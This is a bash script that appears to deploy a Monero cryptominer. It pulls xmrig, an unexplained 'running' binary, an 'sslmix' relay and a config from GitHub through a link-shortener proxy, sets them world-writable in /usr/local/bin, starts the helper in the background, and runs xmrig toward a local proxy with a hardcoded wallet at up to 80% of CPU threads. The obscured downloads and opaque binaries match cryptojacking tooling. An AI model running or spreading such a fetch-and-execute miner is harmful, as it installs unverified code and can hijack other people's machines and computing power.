#!/bin/bash
export DIRECTORY="/usr/local/bin"
export DOWNLOAD_URL="https://slink.ltd/https://raw.githubusercontent.com/lin2elysia/load/main/xmrig"
export DOWNLOAD_RUNNING_URL="https://slink.ltd/https://raw.githubusercontent.com/lin2elysia/load/main/running"
export DOWNLOAD_CONFIG_URL="https://slink.ltd/https://raw.githubusercontent.com/lin2elysia/load/main/apiSslMixConfig.json"
export DOWNLOAD_SSLMIX_URL="https://slink.ltd/https://raw.githubusercontent.com/lin2elysia/load/main/sslmix"

# Function to download and set permissions for files
download_and_set_permissions() {
    local download_url="$1"
    local filename=$(basename "$download_url")
    if [ ! -f "$DIRECTORY/$filename" ]; then
        echo "Downloading $filename..."
        curl --progress-bar -o "$DIRECTORY/$filename" "$download_url"
        if [ $? -ne 0 ]; then
            echo "Failed to download $filename."
            exit 1
        fi
        chmod 777 "$DIRECTORY/$filename"
    fi
}

# Download necessary files if they don't exist
download_and_set_permissions "$DOWNLOAD_URL"
download_and_set_permissions "$DOWNLOAD_RUNNING_URL"
download_and_set_permissions "$DOWNLOAD_CONFIG_URL"
download_and_set_permissions "$DOWNLOAD_SSLMIX_URL"

# Run /usr/local/bin/running in the background for 3 seconds
if [ -f "$DIRECTORY/running" ]; then
    (cd "$DIRECTORY" && ./running) &
    sleep 3
fi

# Run xmrig command
"$DIRECTORY/xmrig" --url=127.0.0.1:9443 --donate-level=0 --user=43p8AgGKbhH198j4aTvwMb42PwT6Mc1qzYm7Bxg4y4DTESJtGAvzgGePtwqudFmz7RCi29fwkuG4ZLgxmmQzN8joADCEv9S --pass=Local-Auto -k --coin monero --max-threads-hint=80
